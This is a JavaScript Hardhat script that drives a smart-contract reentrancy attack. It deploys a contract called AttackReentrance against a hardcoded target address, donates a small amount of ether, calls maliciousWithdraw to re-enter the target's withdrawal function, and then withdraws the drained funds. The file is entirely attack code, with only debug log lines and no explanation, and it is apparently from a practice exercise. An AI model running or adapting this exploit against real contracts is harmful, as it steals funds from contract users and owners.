async function main() {
    const [deployer] = await ethers.getSigners();

    const AttackReentrance = await ethers.getContractFactory("AttackReentrance");
    const attackReentrance = await AttackReentrance.deploy("1000000000000000" ,"0xC6F72A3AA0fDD2ed3491661114AA8c3fEA461A77");
    console.log("attackReentrance address:", attackReentrance.address);
    await attackReentrance.donate({value: "1000000000000000"});
    console.log("1111")
    await attackReentrance.maliciousWithdraw("1000000000000000", {gasLimit: "10000000"});
    console.log("2222")
    await attackReentrance.withdraw();
    console.log("3333")
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });